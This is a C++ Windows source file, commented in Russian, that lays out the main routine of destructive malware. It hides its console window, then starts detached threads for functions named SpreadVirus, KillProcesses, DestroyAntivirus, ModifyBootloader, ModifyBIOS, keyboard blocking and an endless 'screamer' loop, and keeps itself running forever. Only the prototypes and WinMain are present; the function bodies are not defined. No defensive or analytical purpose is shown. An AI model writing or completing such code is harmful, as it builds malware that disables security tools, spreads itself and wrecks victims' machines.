#include <windows.h>
#include <iostream>
#include <thread>
#include <vector>
#include <filesystem>
#include <fstream>
#include <string>
#include <random>
#include <chrono>
#include <tlhelp32.h>
#include <shlobj.h>
#include <shellapi.h>

namespace fs = std::filesystem;

// Прототипы функций
void InitializeScareModule();
void InitializeFileSystemModule();
void InitializeKeyboardBlockModule();
void SpreadVirus();
void KillProcesses();
void DestroyAntivirus();
void ModifyBootloader();
void ModifyBIOS();
void OpenRandomAppsAndSites();
void ScreamerLoop();

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Скрываем окно
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);

    // Создаём множество потоков для параллельной работы
    std::vector<std::thread> threads;

    // Основные модули
    threads.emplace_back(InitializeScareModule);
    threads.emplace_back(InitializeFileSystemModule);
    threads.emplace_back(InitializeKeyboardBlockModule);
    threads.emplace_back(KillProcesses);
    threads.emplace_back(DestroyAntivirus);
    threads.emplace_back(ModifyBootloader);
    threads.emplace_back(ModifyBIOS);
    threads.emplace_back(OpenRandomAppsAndSites);
    threads.emplace_back(SpreadVirus);

    // Бесконечный цикл скримеров
    threads.emplace_back(ScreamerLoop);

    // Ждём завершения всех потоков (никогда не произойдёт)
    for (auto& t : threads) {
        if (t.joinable()) t.detach();
    }

    // Вечный цикл, чтобы программа не закрывалась
    while (true) {
        Sleep(10000);
    }

    return 0;
}
